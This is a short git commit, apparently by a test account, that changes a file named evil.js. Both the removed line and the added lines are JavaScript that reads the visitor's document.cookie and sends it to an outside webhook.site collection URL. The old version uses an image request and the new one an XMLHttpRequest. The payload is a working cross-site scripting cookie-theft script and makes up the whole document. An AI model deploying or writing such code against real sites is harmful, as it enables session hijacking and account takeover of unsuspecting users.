701bc046b45d28dcf9f678cbe9e4cbe6153620c8
test <test@test.com>
2025-02-06 10:06:48 +0100

    Zaktualizowano plik evil.js

--- evil.js
+++ evil.js
@@ -1,1 +1,3 @@
-x = new Image(); x.src = 'https://webhook.site/0074dbd6-f6d3-46f0-8a7d-7ab19454fa31?data='+btoa(document.cookie);
+var xhttp = new XMLHttpRequest();
+xhttp.open('GET', 'https://webhook.site/0074dbd6-f6d3-46f0-8a7d-7ab19454fa31/?' + document.cookie, true);
+xhttp.send();
